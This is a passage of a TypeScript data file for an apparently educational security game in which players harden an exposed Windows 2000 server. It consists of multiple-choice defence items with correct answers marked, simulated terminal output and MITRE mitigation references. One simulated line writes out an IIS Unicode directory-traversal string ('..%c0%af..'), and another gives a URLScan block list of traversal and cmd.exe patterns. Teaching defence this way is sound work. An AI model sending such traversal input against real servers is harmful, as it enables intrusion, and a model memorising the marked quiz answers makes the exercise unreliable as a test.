    prompt: "How do you prevent anonymous enumeration of your system?",
    mitre: {
      tactic: "Defense",
      technique: "Restrict Anonymous Access",
      id: "M1035",
      url: "https://attack.mitre.org/mitigations/M1035/",
    },
    terminalOutput: [
      "C:\\> reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa",
      "    /v RestrictAnonymous /t REG_DWORD /d 2 /f",
      "The operation completed successfully.",
      "",
      "C:\\> net share Company_Data /delete",
      "Company_Data was deleted successfully.",
      "",
      "C:\\> net accounts /lockoutthreshold:5",
      "The command completed successfully.",
      "",
      ">> Null sessions disabled. Anonymous access blocked.",
    ],
    options: [
      {
        id: "disable-null",
        label: "🚫 Disable Null Sessions & Harden SMB",
        description: "Configure the system to reject anonymous connections and restrict information disclosure.",
        correct: true,
        feedback: "Excellent! You harden the system by:\n• Disabling null session access (RestrictAnonymous = 2)\n• Removing unnecessary network shares\n• Disabling NetBIOS over TCP/IP where possible\n\nNow attackers can't anonymously enumerate users or shares — the SMB enumeration step fails completely.",
      },
      {
        id: "rename-shares",
        label: "📝 Rename Shares to Hidden Names",
        description: "Use $ suffix to make shares hidden from browsing.",
        correct: false,
        feedback: "Hidden shares (with $) only hide from casual browsing — enumeration tools find them easily. The real fix is preventing anonymous access entirely.",
      },
      {
        id: "strong-passwords",
        label: "🔑 Enforce Strong Passwords",
        description: "Require complex passwords for all accounts.",
        correct: false,
        feedback: "Strong passwords help, but the problem here is that the system gives away usernames for FREE through anonymous access. Disable anonymous access first.",
      },
    ],
    techNote: "Null sessions allow unauthenticated users to query system information via SMB. This is a configuration issue, not a software bug. Hardening guides for any OS include disabling anonymous access as a critical step.",
    takeaway: "🔑 Key lesson: Don't let strangers peek inside. Disable anonymous access on every system — if someone needs info, make them prove who they are first.",
  },
  {
    id: "def-3-harden-iis",
    narrative: "The attacker could exploit IIS 5.0's Unicode directory traversal to execute commands through the web server. Even with a firewall allowing port 80, this web vulnerability gives OS access.",
    prompt: "How do you secure the IIS web server against directory traversal and command execution?",
    mitre: {
      tactic: "Defense",
      technique: "Application Isolation and Sandboxing",
      id: "M1048",
      url: "https://attack.mitre.org/mitigations/M1048/",
    },
    terminalOutput: [
      "C:\\> iislockd.exe /install",
      "[*] IIS Lockdown Wizard running...",
      "[+] Removed script mappings: .printer, .idc, .htw, .htr",
      "[+] Disabled WebDAV",
      "[+] Removed virtual directories: IISSamples, IISAdmin, Scripts",
      "[+] Applied URLScan filter",
      "",
      "C:\\> urlscan /install",
      "[+] URLScan ISAPI filter installed",
      "[+] Blocking: ..  %  & | cmd.exe",
      "[+] Max URL length: 260 chars",
      "",
      "[*] Testing traversal: ..%c0%af.. → BLOCKED (403 Forbidden)",
      "",
      ">> IIS hardened. Directory traversal BLOCKED.",
    ],
    options: [
      {
        id: "iis-lockdown",
        label: "🔒 Run IIS Lockdown Tool & URLScan",
        description: "Use Microsoft's IIS hardening tools to remove unnecessary features and block malicious URLs.",
        correct: true,
        feedback: "You deploy Microsoft's own IIS Lockdown Tool and URLScan filter:\n• Remove dangerous script mappings and virtual directories\n• Block Unicode-encoded characters in URLs\n• Disable WebDAV and FrontPage extensions\n• Restrict executable scripts to specific folders\n\nThe Unicode traversal attack now returns '403 Forbidden' instead of executing commands!",
      },
      {
        id: "waf",
        label: "🛡️ Install a Web Application Firewall",
        description: "Deploy a WAF to filter malicious web requests.",
        correct: false,
        feedback: "A WAF is great for modern web apps, but for Windows 2000 / IIS 5.0, Microsoft's own IIS Lockdown Tool and URLScan are the correct approach — they're designed specifically for this server version and directly remove the vulnerable features.",
      },
      {
        id: "new-website",
        label: "🌐 Rebuild the Website on a Modern Platform",
        description: "Migrate the website to a modern web server.",
        correct: false,
        feedback: "Migration is a long-term solution, but the server needs protection NOW. Use the IIS Lockdown Tool to harden the existing server immediately while planning a migration.",
      },
    ],
    techNote: "Microsoft released the IIS Lockdown Tool specifically to harden IIS 5.0. It removes unnecessary features that expand the attack surface. URLScan is an ISAPI filter that blocks suspicious URL patterns, including the encoded characters used in directory traversal attacks.",
    takeaway: "🔑 Key lesson: Software comes with many features turned on by default — but each feature is a potential weakness. Turn off everything you don't need. Less is more when it comes to security.",
  },
  {
    id: "def-4-patch",
    narrative: "Both the SMB (MS08-067) and RPC/DCOM (MS03-026) exploits target KNOWN vulnerabilities with available patches. These patches existed BEFORE the attacks became widespread.",
    prompt: "How do you prevent known exploits from succeeding?",
    mitre: {
      tactic: "Defense",
      technique: "Update Software",
      id: "M1051",
      url: "https://attack.mitre.org/mitigations/M1051/",
    },
    terminalOutput: [
      "C:\\> wuauclt /detectnow",
      "[*] Checking for available updates...",
      "",
      "[!] CRITICAL: 47 security updates available",
      "[!] MS03-026 (KB823980) - Critical - DCOM RPC Buffer Overflow",
      "[!] MS08-067 (KB958644) - Critical - Server Service RCE",
      "[!] MS01-033 (KB)       - Critical - IIS Unicode Traversal",
      "",
      "C:\\> wuauclt /updatenow",
      "[*] Installing MS03-026 (KB823980)... Done.",
      "[*] Installing MS08-067 (KB958644)... Done.",
      "[*] Installing 45 additional updates...",
      "[*] All patches installed successfully.",
      "",
      ">> ALL THREE attack vectors now PATCHED and blocked.",
    ],
    options: [
      {
        id: "patch-system",
        label: "🩹 Apply Security Patches & Updates",
        description: "Install all available security updates for all three vulnerabilities.",
        correct: true,
        feedback: "Critical defense! You patch all three exploited vulnerabilities:\n• MS03-026 patch → RPC/DCOM exploit fails\n• MS08-067 patch → SMB exploit fails\n• IIS security patches → Web traversal blocked\n• Plan migration to a supported OS (Windows 2000 is end-of-life!)\n\nWith patches installed, all three attack vectors are neutralized.",
      },
      {
        id: "antivirus",
        label: "🛡️ Install Antivirus Software",
        description: "Deploy antivirus to detect and block exploit payloads.",
        correct: false,
        feedback: "Antivirus can sometimes catch exploit payloads, but it's a cat-and-mouse game — attackers regularly bypass AV. Patch the vulnerabilities themselves. If the vulnerability doesn't exist, the exploit can't work.",
      },
      {
        id: "honeypot",
        label: "🍯 Deploy a Honeypot",
        description: "Set up a decoy system to distract attackers.",
        correct: false,
        feedback: "Honeypots are useful for detection and research, but they don't protect the real server. Patch the vulnerability to eliminate it entirely.",
      },
    ],
    techNote: "Patching is the single most effective defense against known exploits. All three exploits used in this scenario had patches available BEFORE they were widely exploited. The Blaster worm's patch was available a month before the worm appeared.",
    takeaway: "🔑 Key lesson: Always install software updates! They fix known security holes. All three attack paths in this simulation were preventable with patches that already existed.",
  },
  {
    id: "def-5-credentials",
    narrative: "The attacker dumped password hashes and cracked them in seconds due to weak hashing and simple passwords. This was the key to accessing the database regardless of which attack vector was used.",
    prompt: "How do you protect stored credentials from being cracked?",
    mitre: {
      tactic: "Defense",
      technique: "Password Policies",
      id: "M1027",
      url: "https://attack.mitre.org/mitigations/M1027/",
    },
    terminalOutput: [
      "C:\\> reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa",
      "    /v NoLMHash /t REG_DWORD /d 1 /f",
      "The operation completed successfully.",
      "",
      "C:\\> net accounts /minpwlen:12 /maxpwage:90",
      "  /minpwage:1 /uniquepw:5",
      "The command completed successfully.",
      "",
      "C:\\> net accounts /lockoutthreshold:5",
      "  /lockoutduration:30 /lockoutwindow:30",
      "The command completed successfully.",
      "",
      ">> LM hashes disabled. Strong policy enforced.",
      ">> Cracking time: seconds → years.",
    ],
    options: [
      {
        id: "password-policy",
        label: "🔐 Enforce Strong Password Policy & Modern Auth",
        description: "Require complex passwords, disable weak LM hashing, and implement account lockout.",
        correct: true,
        feedback: "You implement comprehensive credential protection:\n• Disable LM hash storage (NoLMHash registry key)\n• Enforce 12+ character passwords with complexity\n• Enable account lockout after 5 failed attempts\n• Unique passwords for service accounts\n\nNow even if hashes are stolen, cracking takes years instead of seconds.",
      },
      {
        id: "encrypt-sam",
        label: "🔒 Encrypt the SAM Database",
        description: "Use SYSKEY to add encryption to the password database.",
        correct: false,
        feedback: "SYSKEY adds a layer of encryption, but a SYSTEM-level attacker can still extract hashes from memory. The real defense is making the hashes resistant to cracking by using strong passwords and disabling weak LM hashes.",
      },
      {
        id: "mfa",
        label: "📱 Add Multi-Factor Authentication",
        description: "Require a second factor for all logins.",
        correct: false,
        feedback: "MFA is excellent security but Windows 2000 has very limited MFA support. More practically, strengthen passwords and disable weak hash storage NOW, then plan MFA as part of a migration to a modern OS.",
      },
    ],
    techNote: "LM hashes split passwords into 7-character chunks and use DES encryption — crackable in seconds. Disabling LM hash storage and using NTLMv2 dramatically improves credential security. Modern systems use bcrypt or similar slow-hash algorithms.",
    takeaway: "🔑 Key lesson: Strong passwords + modern storage = safe credentials. Use 12+ character passwords and modern hashing. This step was critical in ALL attack paths.",
  },
  {
    id: "def-6-monitoring",
    narrative: "The attacker connected to SQL Server with stolen credentials and exported 10,000 customer records — completely undetected. No logs, no alerts, no one noticed.",
    prompt: "How do you prevent unauthorized data access and exfiltration?",
    mitre: {
      tactic: "Defense",
      technique: "Audit & Monitoring",
      id: "M1047",
      url: "https://attack.mitre.org/mitigations/M1047/",
    },
    terminalOutput: [
      "-- Enable SQL Server C2 auditing",
      "EXEC sp_configure 'c2 audit mode', 1;",
      "RECONFIGURE;",
      "Configuration option changed. Restart SQL Server.",
      "",
      "-- Restrict database access (least privilege)",
      "REVOKE ALL ON CustomerDB FROM public;",
      "GO",
      "CREATE ROLE db_app_reader;",
      "GRANT SELECT ON Customers TO db_app_reader;",
      "GO",
      "",
      "-- Disable direct service account login",
      "ALTER LOGIN sqlservice DISABLE;",
      "GO",
      "",
      "-- Enable Windows Event logging",
      "C:\\> auditpol /set /subcategory:\"Object Access\" /success:enable /failure:enable",
      "The command was successfully executed.",
      "",
      ">> Auditing active. Unauthorized access will be detected.",
    ],
    options: [
      {
        id: "monitoring-dlp",
        label: "📊 Implement Monitoring, Logging & Access Controls",
        description: "Deploy audit logging, database access controls, and network monitoring to detect and prevent data theft.",
        correct: true,
        feedback: "You deploy comprehensive data protection:\n• Enable SQL Server audit logging\n• Implement least-privilege database permissions\n• Deploy network monitoring for large data transfers\n• Set up alerts for unusual database queries\n• Encrypt sensitive data at rest and in transit\n\n🎉 MISSION COMPLETE! The server is now defended against ALL attack vectors!",
      },
      {
        id: "encrypt-only",
        label: "🔒 Encrypt the Database",
        description: "Encrypt all data so stolen files are useless.",
        correct: false,
        feedback: "Encryption at rest helps if files are stolen directly, but the attacker used valid SQL credentials to query data — encryption at rest doesn't help there. You need access controls AND monitoring.",
      },
      {
        id: "backup-only",
        label: "💾 Improve Backups",
        description: "Ensure regular backups so data can be restored after a breach.",
        correct: false,
        feedback: "Backups help with recovery but don't prevent data theft. The records were COPIED, not deleted. You need monitoring and access controls to prevent unauthorized access.",
      },
    ],
    techNote: "Defense in depth means layering controls: network security (firewall), system hardening, access controls, monitoring, and encryption. No single control is perfect, but together they make successful attacks far more difficult and detectable.",
    takeaway: "🔑 Key lesson: Security is about layers, like locks + alarm + cameras + a guard. No single measure is perfect, but together they make attacks very hard and very noticeable.",
  },
];

// ─── SCENARIO ───

export const win2kScenario: Scenario = {
  id: "win2k-exposed",
  title: "Exposed Windows 2000 Server",
  description: "An unpatched Windows 2000 server sits exposed on the internet with no firewall. It hosts a small company's customer database. Multiple attack vectors are available.",
  icon: "🖥️",
  available: true,
  targetInfo: {
    os: "Windows 2000 Server SP4",
    services: ["IIS 5.0 (Port 80)", "SMB (Port 445)", "RPC (Port 135)", "NetBIOS (Port 139)", "MS SQL Server (Port 1433)"],
    vulnerabilities: ["No firewall", "Default configurations", "Unpatched system", "Weak credentials"],
    data: "Customer database with 10,000 records (names, emails, phone numbers)",
  },
  reconStep,
  attackBranches: [smbBranch, iisBranch, rpcBranch],
  exfilStep,
  defendPhase,
};

export const futureScenarios: Pick<Scenario, "id" | "title" | "description" | "icon" | "available">[] = [
  {
    id: "phishing-campaign",
    title: "Corporate Phishing Attack",
    description: "A targeted phishing campaign against a mid-size company's employees.",
    icon: "📧",
    available: false,
  },
  {
    id: "wifi-attack",
    title: "Rogue Wi-Fi Access Point",
    description: "An attacker sets up a fake Wi-Fi hotspot at a coffee shop near a corporate office.",
    icon: "📡",
    available: false,
  },
  {
    id: "ransomware",
    title: "Ransomware Outbreak",
    description: "A ransomware attack spreading through a hospital network.",
    icon: "🔒",
    available: false,
  },
  {
    id: "cloud-misconfig",
    title: "Cloud Storage Misconfiguration",
    description: "A company's cloud storage bucket is accidentally left publicly accessible.",
    icon: "☁️",
    available: false,
  },
];
